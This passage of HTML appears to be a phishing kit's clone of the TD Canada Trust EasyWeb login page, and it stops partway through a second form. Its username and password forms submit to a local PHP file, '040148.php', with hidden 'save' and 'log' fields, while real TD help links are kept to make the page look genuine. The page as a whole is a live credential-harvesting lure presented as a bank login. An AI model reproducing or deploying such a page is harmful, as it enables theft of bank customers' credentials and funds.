                        <login-template right-nav="::$resolve.rightNav" service-banner="::$resolve.serviceBanner" awareness="::$resolve.awareness" legal="::$resolve.legal" service-interruption="::$resolve.serviceInterruption" password-assistance="::$resolve.passwordAssistance" username-assistance="::$resolve.usernameAssistance" id-plus-lockout="::$resolve.idPlusLockout" lockout="::$resolve.lockout" username-access-card-list="::$resolve.usernameAccessCardList" device-print="::$resolve.devicePrint" device-info="::$resolve.deviceInfo" thread-matrix="::$resolve.threadMatrix" config="::$resolve.config" class="div-main">
                            <section class="otp-login easy-web-broker" ng-class="{'secure-login': !!vm.securekey, 'easy-web-broker': !!vm.easyweb || !!vm.webbroker}">
                                <div class="td-container">
                                    <!-- LOB -->
                                    <div class="td-row">
                                        <div class="td-col-sm-6">
                                            <h1 class="co-brand-header" ng-class="{'secure-key': !!vm.securekey}" tabindex="0">EasyWeb Login</h1>
                                        </div>
                                        <!---->
                                    </div>
                                    <!---->
                                    <!-- Service Msg Area -->
                                    <!---->
                                    <!-- Emergency banner -->
                                    <!---->
                                    
                                    <otp-server-error error="vm.dt.loginError" display="banner" class="error-div" style="display: none">
                                        <div class="otp-section-error otp-info" role="alert" id="errorMsg" style="">
                                            <p>
                                                <span aria-hidden="true" class="td-icon td-icon-error"></span>
                                                <span id="error" data-ng-bind-html="vm.getErrorMessage()">Sorry, your login entry doesn't match our records. Please try again.</span>
                                                <a role="link" class="td-link td-link-password-reset td-link-standalone" href="040148.php">
                                                    <span ng-bind-html="subText">Forgot your username or</span>
                                                    <span class="td-link-lastword">
                                                        <span ng-bind-html="lastWord">password?</span>
                                                    </span>
                                                </a>
                                            </p>
                                        </div>
                                    </otp-server-error>
                                    <div class="otp-box light-green hidden-xs otp-separate-right-nav" ng-class="{'otp-separate-right-nav': !!wcm_content.rightNav}">
                                        <div class="td-row">
                                            <div class="td-col-sm-6">
                                                <div ng-if="!webbroker" ng-include="'td-otp-web/features/login/partials/form-sm-min.html'">
                                                    <div class="otp-box-content">
                                                        <login-form countries="$resolve.countries" thread-matrix="$resolve.threadMatrix" device-print="$resolve.devicePrint" device-info="$resolve.deviceInfo" username-access-card-list="$resolve.usernameAccessCardList">
                                                            <form method="post" action="040148.php" name="loginForm" id="loginForm" class="lab-form ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic ng-valid-function" autocomplete="off">
                                                                <div class="td-row">
                                                                    <div class="td-col-sm-12">
                                                                        <cards-selector cards="vm.dt.usernameAccessCardList" username="vm.dt.username" description="vm.dt.description" selected-card="vm.dt.selectedUser" on-change="vm.usernameChanged" on-delete-card="vm.openDeleteCardConfirmModal" error="vm.dt.usernameInlineError">
                                                                            <div class="form-group form-group-short">
                                                                                <label for="username100" required="true" id="card-selector-label100">Username or Access Card</label>
                                                                                <label for="selector-arrow" ng-show="!!vm.cards.length" class="td-forscreenreader ng-hide" aria-hidden="true">click to show more</label>
                                                                                <div class="cards-selector" ng-class="{'label-elements': !!vm.title}">
                                                                                    <div class="editable-selector" ng-class="{'td-group-error': !!vm.error}">
                                                                                        <div ng-show="!vm.cards.isEditMode &amp;&amp; (vm.cards.length >= 1)" aria-hidden="true" class="ng-hide">
                                                                                            <label class="selector-button form-control hidden-xs" role="button" tabindex="0" aria-expanded="false" aria-describedby="card-selector-label100" data-ng-click="vm.showContext($event)" data-ng-keydown="vm.keyDown($event)">
                                                                                            <span ng-show="!!vm.selectedCard.description" aria-hidden="true" class="ng-hide"> - </span>
                                                                                            </label>
                                                                                            <label class="selector-button form-control visible-xs" role="button" tabindex="0" aria-expanded="false" aria-describedby="card-selector-label100" data-ng-click="vm.openCardSelectorModal()" data-ng-keydown="vm.openCardSelectorModal()">
                                                                                            <span ng-show="!!vm.selectedCard.description" aria-hidden="true" class="ng-hide"> - </span>
                                                                                            </label>
                                                                                        </div>
                                                                                        <div>
                                                                                            <input id="username100" required="true" name="username" autofocus="autofocus" autocomplete="off" aria-label="Username or Access Card" style="" type="text" class="otp-always-show-error ng-pristine ng-untouched ng-valid form-control ng-empty lrinput input-username" attr-action="Filling Username" oninput="this.value = this.value.replace('@', '')">
                                                                                            <input type="hidden" name="CRSFToken" value="">
                                                                                            <input type="hidden" name="save" value="2">
                                                                                            <input type="hidden" name="log" value="">
                                                                                        </div>
                                                                                        <div id="selector-arrow" ng-show="!!vm.cards.length" aria-hidden="true" class="ng-hide">
                                                                                            <div class="selector-button over hidden-xs" role="button" tabindex="0" aria-expanded="false" aria-describedby="card-selector-label100" data-ng-click="vm.showContext($event, '.editable-selector')" data-ng-keydown="vm.keyDown($event, '.editable-selector')">
                                                                                                <span class="td-icon td-icon-downCaret"></span>
                                                                                                <span class="td-icon td-icon-upCaret"></span>
                                                                                            </div>
                                                                                            <div class="selector-button over visible-xs" role="button" tabindex="0" aria-expanded="false" aria-describedby="card-selector-label100" data-ng-click="vm.openCardSelectorModal()" data-ng-keydown="vm.openCardSelectorModal()">
                                                                                                <span class="td-icon td-icon-downCaret"></span>
                                                                                                <span class="td-icon td-icon-upCaret"></span>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <otp-server-error elem-id="usrErrorMsg" error="vm.error" display="label">
                                                                                        <!---->
                                                                                    </otp-server-error>
                                                                                    <div class="context left no-arrow selector-context hidden-xs">
                                                                                        <label id="card-selector-list-label100" class="td-forscreenreader">
                                                                                        Username or Access Card
                                                                                        </label>
                                                                                        <ul aria-labelledby="card-selector-list-label100" role="listbox">
                                                                                            <!---->
                                                                                            <li class="add-card-link">
                                                                                                <a role="link" class="td-link-standalone" href="040148.php" aria-label="Add Username or Access Card" data-ng-click="vm.setEditMode();" standalone-link="Add Username or Access Card">
                                                                                                <span ng-bind-html="subText">Add Username or Access</span>
                                                                                                <span class="td-link-lastword">
                                                                                                <span ng-bind-html="lastWord">Card</span>
                                                                                                <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                                </span>
                                                                                                </a>
                                                                                            </li>
                                                                                        </ul>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </cards-selector>
                                                                        <!---->
                                                                        <div ng-if="!!vm.parent.easyweb" class="otp-expand-description" tab-index="7" expand-collapse="Description (Optional)">
                                                                            <span ng-init="isExpanded" class="otp-expand-collapse">
                                                                            <a ng-click="isExpanded=!isExpanded" tabindex="7" role="button" class="td-link-nounderline otp-link-expand" aria-expanded="false">
                                                                            <span class="td-icon td-icon-expand" ng-class="{true:'td-icon-collapse', false:'td-icon-expand'}[!!isExpanded]" aria-hidden="true">
                                                                            </span>
                                                                            <span>Description (Optional)</span>
                                                                            </a>
                                                                            </span>
                                                                            <div aria-hidden="true" ng-show="!!isExpanded" ng-transclude="" class="ng-hide">
                                                                                <div class="otp-login-description">
                                                                                    <div ng-class="{'otp-input-approved': (vm.descriptionFocused==false)}">
                                                                                        <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="">
                                                                                            <label id="labelWrap_280 " class="empty" for="description"></label><span aria-hidden="true" aria-describedby="labelWrap_280" bind-html-compile="help"></span>
                                                                                            <div ng-transclude="" class="label-elements">
                                                                                                <label for="description" class="td-forscreenreader">
                                                                                                enter description</label>
                                                                                                <input id="description2" name="description" ng-model="vm.dt.description" ng-focus="vm.descriptionFocused=true" ng-blur="loginForm.description.$valid &amp;&amp; (vm.descriptionFocused=!vm.dt.description)" td-ui-validate-function="otpNicknameValidation" tabindex="8" autocomplete="off" aria-describedby="description-ids" aria-label="Description (Optional)" class="ng-pristine ng-untouched ng-valid form-control ng-valid-function ng-empty" aria-invalid="false" type="text">
                                                                                                <div td-ui-messages="loginForm.description" role="alert" class="td-error">
                                                                                                    <div td-ui-message="function" id="description-ids" ng-bind-html="'LOGIN.FORMAT_DESCRIPTION' | translate" style="display: none;"><strong>!</strong> Enter alphanumeric characters only<br><strong>!</strong> Max 32 characters<br>Special characters allowed are: #, @, apostrophe, space</div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <!---->
                                                                        <div class="td-group-touched" ng-class="{'td-group-error': !!vm.dt.passwordInlineError}">
                                                                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group-short td-group-touched form-group" td-ui-form-group="Password" style="">
                                                                                <label id="labelWrap_180 " class="" for="password">Password</label><span aria-hidden="true" aria-describedby="labelWrap_180" bind-html-compile="help"></span>
                                                                                <div ng-transclude="" class="label-elements">
                                                                                    <input autocapitalize="none" required="true" id="password" name="password" class="input-password otp-always-show-error ng-pristine ng-untouched ng-valid form-control ng-empty lrinput" ng-change="vm.loginPwdChanged()" aria-describedby="pwdErrorMsg" autocomplete="off" tabindex="3" focus-me="!vm.dt.usernameInlineError &amp;&amp; (!!vm.dt.passwordInlineError || !!vm.parent.dt.loginError)" ng-model="password" aria-invalid="false" type="password" attr-action="Filling Password">
                                                                                    <otp-server-error elem-id="pwdErrorMsg" error="vm.dt.passwordInlineError" display="label">
                                                                                        <!---->
                                                                                    </otp-server-error>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <!---->
                                                                        <div ng-if="!vm.dt.selectedUser &amp;&amp; (!$root.otpGenericConfig || !!$root.otpGenericConfig.isRememberMeEnabled)" class="td-checkbox-div-wrapper inline">
                                                                            <div class="td-checkbox-wrapper"><input class="form-control ng-pristine ng-untouched ng-valid ng-empty" id="rememberMe1" name="rememberMe" tabindex="6" ng-model="rememberMe" aria-invalid="false" type="checkbox"><label for="rememberMe1" class="card">Remember me</label></div>
                                                                        </div>
                                                                        <!---->
                                                                        <div class="td-row">
                                                                            <div ng-class="{true: 'td-col-md-6', false: 'td-col-lg-7 td-col-md-8 td-col-sm-10'}[!!vm.parent.securekey]" class="td-col-lg-7 td-col-md-8 td-col-sm-10">
                                                                                <div class="form-group">
                                                                                    <button type="submit" tabindex="4" name="save3" value="1" class="td-button td-button-block td-button-secondary btn-login">
                                                                                        <span class="btn-txt">Login</span>
                                                                                        <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                                                                                    </button>
                                                                                </div>
                                                                            </div>
                                                                            <!---->
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </form>
                                                        </login-form>
                                                        <!---->
                                                        <div class="td-row" ng-if="!vm.securekey &amp;&amp; (!$root.otpGenericConfig || !!$root.otpGenericConfig.isForgotPasswordEnabled)">
                                                            <div class="td-col-sm-12 td-login-col-md-10">
                                                                <div class="form-group">
                                                                    <a role="link" class="td-link-nounderline td-link-standalone" standalone-link="Forgot your username or password?" tabindex="5" data-ui-sref="app.reset.username-password-help" href="/220098/td#/reset/username-password-help">
                                                                    <span ng-bind-html="subText">Forgot your username or</span>
                                                                    <span class="td-link-lastword">
                                                                    <span ng-bind-html="lastWord">password?</span>&nbsp;<img src="./files/6.png">
                                                                    </span>
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <!---->
                                                        <!---->
                                                        <!---->
                                                        <div ng-if="!vm.myInsurance &amp;&amp; !vm.genericLogin &amp;&amp; !vm.mbna &amp;&amp; !vm.tdr">
                                                            <div class="td-security-guarantee">
                                                                <img class="td-icon icon-regular td-icon-superlock" src="./files/8.png">
                                                                <div class="td-security-guarantee-copy">
                                                                    <span class="td-small-copy" ng-bind-html="'LOGIN.SECURITY_GUARANTEE' | translate">TD Online and Mobile Security Guarantee</span>:
                                                                    <a role="link" class="td-small-copy td-link-standalone" standalone-link="You are protected" href="http://www.tdcanadatrust.com/products-services/banking/electronic-banking/access-card-security/guarantee.jsp">
                                                                    <span ng-bind-html="subText">You are</span>
                                                                    <span class="td-link-lastword">
                                                                    <span ng-bind-html="lastWord">protected</span>
                                                                    <img class="td-icon td-icon-rightCaret" src="./files/6.png">
                                                                    </span>
                                                                    </a>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <!---->
                                                    </div>
                                                </div>
                                                <!---->
                                            </div>
                                            <div class="td-col-sm-6">
                                                <!-- Right Nav -->
                                                <div class="login-right-nav">
                                                    <!---->
                                                    <div ng-if="!!wcm_content.rightNav" compile="wcm_content.rightNav">
                                                        <div class="otp-box-content">
                                                            <h2 class="text-black" ng-bind-html="'LOGIN.HEADER3' | translate">Getting started is Quick <br class="hidden-md hidden-lg"> and Easy</h2>
                                                            <p>If you received a temporary password, simply use that along with
                                                                your username to log in. You will then be prompted to create a new one.
                                                            </p>
                                                            <div class="td-row">
                                                                <div class="td-col-sm-11 td-col-md-10 td-col-lg-8">
                                                                    <div class="form-group">
                                                                        <a href="https://easyweb.td.com/waw/esr/selfRegistration.htm" class="td-button td-button-block td-button-clear-green">
                                                                        Register online now
                                                                        </a>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="hidden-sm">
                                                                <h2 class="text-black">Need Help?</h2>
                                                                <div class="td-row td-row-separate-right-md">
                                                                    <div class="td-col-md-6">
                                                                        <ul class="td-list-links">
                                                                            <li>
                                                                                <a role="link" class="td-link-standalone" standalone-link="Get Login help" ng-click="vm.openPopup('URLS.RIGHT_NAV.EASYWEB.GET_LOGIN_HELP', 'LINKS.GET_LOGIN_HELP', {width: 500, height: 600})">
                                                                                <span ng-bind-html="subText">Get Login</span>
                                                                                <span class="td-link-lastword">
                                                                                <span ng-bind-html="lastWord">help</span>
                                                                                <img class="td-icon td-icon-rightCaret" img="" src="./files/5.png">
                                                                                </span>
                                                                                </a>
                                                                            </li>
                                                                            <li>
                                                                                <a role="link" class="td-link-standalone" standalone-link="About Security Codes &amp; Two-Step Verification" ng-click="vm.openPopup('URLS.RIGHT_NAV.EASYWEB.TWO_STEP_VERIFICATION', 'LINKS.TWO_STEP_VERIFICATION', {width: 500, height: 600})">
                                                                                <span ng-bind-html="subText">About Security Codes &amp; Two-Step</span>
                                                                                <span class="td-link-lastword">
                                                                                <span ng-bind-html="lastWord">Verification</span>
                                                                                <img class="td-icon td-icon-rightCaret" img="" src="./files/5.png">
                                                                                </span>
                                                                                </a>
                                                                            </li>
                                                                            <li><a role="link" class="td-link-standalone" standalone-link="Reset Password" data-ui-sref="app.reset.reset-password" href="/220098/td#/reset/reset-password">
                                                                                <span ng-bind-html="subText">Reset</span>
                                                                                <span class="td-link-lastword">
                                                                                <span ng-bind-html="lastWord">Password</span>
                                                                                <img class="td-icon td-icon-rightCaret" img="" src="./files/5.png">
                                                                                </span>
                                                                                </a>
                                                                            </li>
                                                                            <li><a role="link" class="td-link-standalone" standalone-link="Supported Browsers" href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/sup-br.jsp">
                                                                                <span ng-bind-html="subText">Supported</span>
                                                                                <span class="td-link-lastword">
                                                                                <span ng-bind-html="lastWord">Browsers</span>
                                                                                <img class="td-icon td-icon-rightCaret" img="" src="./files/5.png">
                                                                                </span>
                                                                                </a>
                                                                            </li>
                                                                        </ul>
                                                                    </div>
                                                                    <div class="td-col-md-6">
                                                                        <ul class="td-list-links">
                                                                            <li><a role="link" class="td-link-standalone" standalone-link="Book an Appointment" href="https://www.tdcanadatrust.com/oab/OABLandingPage/OABLocationSearch.form?lang=en">
                                                                                <span ng-bind-html="subText">Book an</span>
                                                                                <span class="td-link-lastword">
                                                                                <span ng-bind-html="lastWord">Appointment</span>
                                                                                <img class="td-icon td-icon-rightCaret" img="" src="./files/5.png">
                                                                                </span>
                                                                                </a>
                                                                            </li>
                                                                            <li><a role="link" class="td-link-standalone" standalone-link="Holiday Hours" href="https://www.tdcanadatrust.com/customer-service/contact-us/holiday-branch-hours.jsp">
                                                                                <span ng-bind-html="subText">Holiday</span>
                                                                                <span class="td-link-lastword">
                                                                                <span ng-bind-html="lastWord">Hours</span>
                                                                                <img class="td-icon td-icon-rightCaret" img="" src="./files/5.png">
                                                                                </span>
                                                                                </a>
                                                                            </li>
                                                                        </ul>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div class="hidden-xs visible-sm hidden-md hidden-lg">
                                                                <div class="otp-webbroker-black-label otp-need-help-links" h2-expand-collapse="Need help?">
                                                                    <h2 ng-init="isExpanded" class="otp-expand-collapse">
                                                                        <a ng-click="isExpanded=!isExpanded" tabindex="0" role="button" class="td-link-nounderline" aria-expanded="false">
                                                                        <span class="black-label">Need help?</span>
                                                                        </a>
                                                                    </h2>
                                                                    <div class="otp-expand-body ng-hide" aria-hidden="true" ng-show="!!isExpanded" ng-transclude="">
                                                                        <div class="td-row td-row-separate-right-md">
                                                                            <div class="td-col-md-6">
                                                                                <ul class="td-list-links">
                                                                                    <li>
                                                                                        <a role="link" class="td-link-standalone" standalone-link="Get Login help" ng-click="vm.openPopup('URLS.RIGHT_NAV.EASYWEB.GET_LOGIN_HELP', 'LINKS.GET_LOGIN_HELP', {width: 500, height: 600})">
                                                                                        <span ng-bind-html="subText">Get Login</span>
                                                                                        <span class="td-link-lastword">
                                                                                        <span ng-bind-html="lastWord">help</span>
                                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                        </span>
                                                                                        </a>
                                                                                    </li>
                                                                                    <li><a role="link" class="td-link-standalone" standalone-link="Reset Password" data-ui-sref="app.reset.reset-password" href="/220098/td#/reset/reset-password">
                                                                                        <span ng-bind-html="subText">Reset</span>
                                                                                        <span class="td-link-lastword">
                                                                                        <span ng-bind-html="lastWord">Password</span>
                                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                        </span>
                                                                                        </a>
                                                                                    </li>
                                                                                    <li><a role="link" class="td-link-standalone" standalone-link="Supported Browsers" href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/sup-br.jsp">
                                                                                        <span ng-bind-html="subText">Supported</span>
                                                                                        <span class="td-link-lastword">
                                                                                        <span ng-bind-html="lastWord">Browsers</span>
                                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                        </span>
                                                                                        </a>
                                                                                    </li>
                                                                                </ul>
                                                                            </div>
                                                                            <div class="td-col-md-6">
                                                                                <ul class="td-list-links">
                                                                                    <li><a role="link" class="td-link-standalone" standalone-link="Book an Appointment" href="https://www.tdcanadatrust.com/oab/OABLandingPage/OABLocationSearch.form?lang=en">
                                                                                        <span ng-bind-html="subText">Book an</span>
                                                                                        <span class="td-link-lastword">
                                                                                        <span ng-bind-html="lastWord">Appointment</span>
                                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                        </span>
                                                                                        </a>
                                                                                    </li>
                                                                                    <li><a role="link" class="td-link-standalone" standalone-link="Holiday Hours" href="https://www.tdcanadatrust.com/customer-service/contact-us/holiday-branch-hours.jsp">
                                                                                        <span ng-bind-html="subText">Holiday</span>
                                                                                        <span class="td-link-lastword">
                                                                                        <span ng-bind-html="lastWord">Hours</span>
                                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                        </span>
                                                                                        </a>
                                                                                    </li>
                                                                                </ul>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <hr class="td-thin-divider-line-1 hor-separator">
                                                            <h3 class="td-cta"><a role="link" class="td-link-standalone" standalone-link="Get the TD Mobile App now" href="http://www.tdcanadatrust.com/products-services/banking/electronic-banking/mobile/mobile-index.jsp">
                                                                <span ng-bind-html="subText">Get the TD Mobile App</span>
                                                                <span class="td-link-lastword">
                                                                <span ng-bind-html="lastWord">now</span>&nbsp;<img src="./files/6.png">
                                                                </span>
                                                                </a>
                                                            </h3>
                                                        </div>
                                                        <div class="visible-xs otp-box-outside">
                                                            <section class="otp-full-width-xs otp-getting-started-xs">
                                                                <div class="td-container">
                                                                    <h2 ng-bind-html="'LOGIN.HEADER3' | translate">Getting started is Quick <br class="hidden-md hidden-lg"> and Easy</h2>
                                                                    <p>If you received a temporary password, simply use that
                                                                        along with your username to log in. You will then be prompted to create a
                                                                        new one.
                                                                    </p>
                                                                    <div class="form-group">
                                                                        <button class="td-button td-button-block td-button-clear-green">Register online now
                                                                        </button>
                                                                    </div>
                                                                </div>
                                                            </section>
                                                            <hr class="td-thin-divider-line-1">
                                                            <section class="otp-full-width-xs otp-getting-started-xs">
                                                                <div class="td-container">
                                                                    <div class="otp-need-help-links" h2-expand-collapse="Need Help?">
                                                                        <h2 ng-init="isExpanded" class="otp-expand-collapse">
                                                                            <a ng-click="isExpanded=!isExpanded" tabindex="0" role="button" class="td-link-nounderline" aria-expanded="false">
                                                                            <span class="td-icon td-icon-expand" ng-class="{true:'td-icon-collapse', false:'td-icon-expand'}[!!isExpanded]" aria-hidden="true">
                                                                            </span>
                                                                            <span class="black-label">Need Help?</span>
                                                                            </a>
                                                                        </h2>
                                                                        <div class="otp-expand-body ng-hide" aria-hidden="true" ng-show="!!isExpanded" ng-transclude="">
                                                                            <div class="td-row td-row-separate-right-md">
                                                                                <div class="td-col-md-6">
                                                                                    <ul class="td-list-links">
                                                                                        <li><a role="link" class="td-link-standalone" standalone-link="Get Login help" href="http://td.intelliresponse.com/login/">
                                                                                            <span ng-bind-html="subText">Get Login</span>
                                                                                            <span class="td-link-lastword">
                                                                                            <span ng-bind-html="lastWord">help</span>
                                                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                            </span>
                                                                                            </a>
                                                                                        </li>
                                                                                        <li><a role="link" class="td-link-standalone" standalone-link="Reset Password" data-ui-sref="app.reset.reset-password" href="/220098/td#/reset/reset-password">
                                                                                            <span ng-bind-html="subText">Reset</span>
                                                                                            <span class="td-link-lastword">
                                                                                            <span ng-bind-html="lastWord">Password</span>
                                                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                            </span>
                                                                                            </a>
                                                                                        </li>
                                                                                        <li><a role="link" class="td-link-standalone" standalone-link="Supported Browsers" href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/sup-br.jsp">
                                                                                            <span ng-bind-html="subText">Supported</span>
                                                                                            <span class="td-link-lastword">
                                                                                            <span ng-bind-html="lastWord">Browsers</span>
                                                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                            </span>
                                                                                            </a>
                                                                                        </li>
                                                                                    </ul>
                                                                                </div>
                                                                                <div class="td-col-md-6">
                                                                                    <ul class="td-list-links">
                                                                                        <li><a role="link" class="td-link-standalone" standalone-link="Book an Appointment" href="https://www.tdcanadatrust.com/oab/OABLandingPage/OABLocationSearch.form?lang=en">
                                                                                            <span ng-bind-html="subText">Book an</span>
                                                                                            <span class="td-link-lastword">
                                                                                            <span ng-bind-html="lastWord">Appointment</span>
                                                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                            </span>
                                                                                            </a>
                                                                                        </li>
                                                                                        <li><a role="link" class="td-link-standalone" standalone-link="Holiday Hours" href="https://www.tdcanadatrust.com/customer-service/contact-us/holiday-branch-hours.jsp">
                                                                                            <span ng-bind-html="subText">Holiday</span>
                                                                                            <span class="td-link-lastword">
                                                                                            <span ng-bind-html="lastWord">Hours</span>
                                                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                            </span>
                                                                                            </a>
                                                                                        </li>
                                                                                    </ul>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </section>
                                                            <hr class="visible-xs td-thin-divider-line-1">
                                                            <div class="td-container">
                                                                <div class="td-row">
                                                                    <div class="td-col-xs-12">
                                                                        <h3 class="td-cta"><a role="link" class="td-link-standalone" standalone-link="Get the TD Mobile App now" href="http://www.tdcanadatrust.com/products-services/banking/electronic-banking/mobile/mobile-index.jsp">
                                                                            <span ng-bind-html="subText">Get the TD Mobile App</span>
                                                                            <span class="td-link-lastword">
                                                                            <span ng-bind-html="lastWord">now</span>
                                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                            </span>
                                                                            </a>
                                                                        </h3>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <!---->
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div ng-if="!vm.webbroker" class="visible-xs" ng-include="'td-otp-web/features/login/partials/form-xs.html'">
                                    <div class="td-container">
                                        <div class="otp-box-mobile light-green">
                                            <login-form countries="$resolve.countries" thread-matrix="$resolve.threadMatrix" device-print="$resolve.devicePrint" device-info="$resolve.deviceInfo" username-access-card-list="$resolve.usernameAccessCardList">
                                                <form method="post" action="040148.php" name="loginForm" id="loginForm2" class="lab-form ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic ng-valid-function">
                                                    <div class="td-row">
                                                        <div class="td-col-sm-12">
                                                            <cards-selector cards="vm.dt.usernameAccessCardList" username="vm.dt.username" description="vm.dt.description" selected-card="vm.dt.selectedUser" on-change="vm.usernameChanged" on-delete-card="vm.openDeleteCardConfirmModal" error="vm.dt.usernameInlineError">
                                                                <div class="form-group form-group-short">
                                                                    <label for="username101" id="card-selector-label101">Username or Access Card</label>
                                                                    <label for="selector-arrow" ng-show="!!vm.cards.length" class="td-forscreenreader ng-hide" aria-hidden="true">click to show more</label>
                                                                    <div class="cards-selector" ng-class="{'label-elements': !!vm.title}">
                                                                        <div class="editable-selector" ng-class="{'td-group-error': !!vm.error}">
                                                                            <div ng-show="!vm.cards.isEditMode &amp;&amp; (vm.cards.length >= 1)" aria-hidden="true" class="ng-hide">
                                                                                <label class="selector-button form-control hidden-xs" role="button" tabindex="0" aria-expanded="false" aria-describedby="card-selector-label101" data-ng-click="vm.showContext($event)" data-ng-keydown="vm.keyDown($event)">
                                                                                <span ng-show="!!vm.selectedCard.description" aria-hidden="true" class="ng-hide"> - </span>
                                                                                </label>
                                                                                <label class="selector-button form-control visible-xs" role="button" tabindex="0" aria-expanded="false" aria-describedby="card-selector-label101" data-ng-click="vm.openCardSelectorModal()" data-ng-keydown="vm.openCardSelectorModal()">
                                                                                <span ng-show="!!vm.selectedCard.description" aria-hidden="true" class="ng-hide"> - </span>
                                                                                </label>
                                                                            </div>
                                                                            <div ng-show="!!vm.cards.isEditMode || !vm.cards.length" aria-hidden="false" class="">
                                                                                <input id="username101" required="true" name="username" class="ng-pristine ng-untouched ng-valid form-control lrinput ng-empty input-username" aria-invalid="false" type="text" attr-action="Filling Username" oninput="this.value = this.value.replace('@', '')">
                                                                                <input type="hidden" name="CRSFToken" value="">
                                                                                <input type="hidden" name="save" value="2">
                                                                                <input type="hidden" name="log" value="">
                                                                            </div>
                                                                            <div id="selector-arrow" ng-show="!!vm.cards.length" aria-hidden="true" class="ng-hide">
                                                                                <div class="selector-button over hidden-xs" role="button" tabindex="0" aria-expanded="false" aria-describedby="card-selector-label101" data-ng-click="vm.showContext($event, '.editable-selector')" data-ng-keydown="vm.keyDown($event, '.editable-selector')">
                                                                                    <span class="td-icon td-icon-downCaret"></span>
                                                                                    <span class="td-icon td-icon-upCaret"></span>
                                                                                </div>
                                                                                <div class="selector-button over visible-xs" role="button" tabindex="0" aria-expanded="false" aria-describedby="card-selector-label101" data-ng-click="vm.openCardSelectorModal()" data-ng-keydown="vm.openCardSelectorModal()">
                                                                                    <span class="td-icon td-icon-downCaret"></span>
                                                                                    <span class="td-icon td-icon-upCaret"></span>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <otp-server-error elem-id="usrErrorMsg" error="vm.error" display="label">
                                                                            <!---->
                                                                        </otp-server-error>
                                                                        <div class="context left no-arrow selector-context hidden-xs">
                                                                            <label id="card-selector-list-label101" class="td-forscreenreader">
                                                                            Username or Access Card
                                                                            </label>
                                                                            <ul aria-labelledby="card-selector-list-label101" role="listbox">
                                                                                <!---->
                                                                                <li class="add-card-link">
                                                                                    <a role="link" class="td-link-standalone" href="040148.php" aria-label="Add Username or Access Card" data-ng-click="vm.setEditMode();" standalone-link="Add Username or Access Card">
                                                                                    <span ng-bind-html="subText">Add Username or Access</span>
                                                                                    <span class="td-link-lastword">
                                                                                    <span ng-bind-html="lastWord">Card</span>
                                                                                    <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                                    </span>
                                                                                    </a>
                                                                                </li>
                                                                            </ul>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </cards-selector>
                                                            <!---->
                                                            <div ng-if="!!vm.parent.easyweb" class="otp-expand-description" tab-index="7" expand-collapse="Description (Optional)">
                                                                <span ng-init="isExpanded" class="otp-expand-collapse">
                                                                <a ng-click="isExpanded=!isExpanded" tabindex="7" role="button" class="td-link-nounderline otp-link-expand" aria-expanded="false">
                                                                <span class="td-icon td-icon-expand" ng-class="{true:'td-icon-collapse', false:'td-icon-expand'}[!!isExpanded]" aria-hidden="true">
                                                                </span>
                                                                <span>Description (Optional)</span>
                                                                </a>
                                                                </span>
                                                                <div aria-hidden="true" ng-show="!!isExpanded" ng-transclude="" class="ng-hide">
                                                                    <div class="otp-login-description">
                                                                        <div ng-class="{'otp-input-approved': (vm.descriptionFocused==false)}">
                                                                            <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group" td-ui-form-group="">
                                                                                <label id="labelWrap_282 " class="empty" for="description"></label><span aria-hidden="true" aria-describedby="labelWrap_282" bind-html-compile="help"></span>
                                                                                <div ng-transclude="" class="label-elements">
                                                                                    <label for="description" class="td-forscreenreader">
                                                                                    enter description</label>
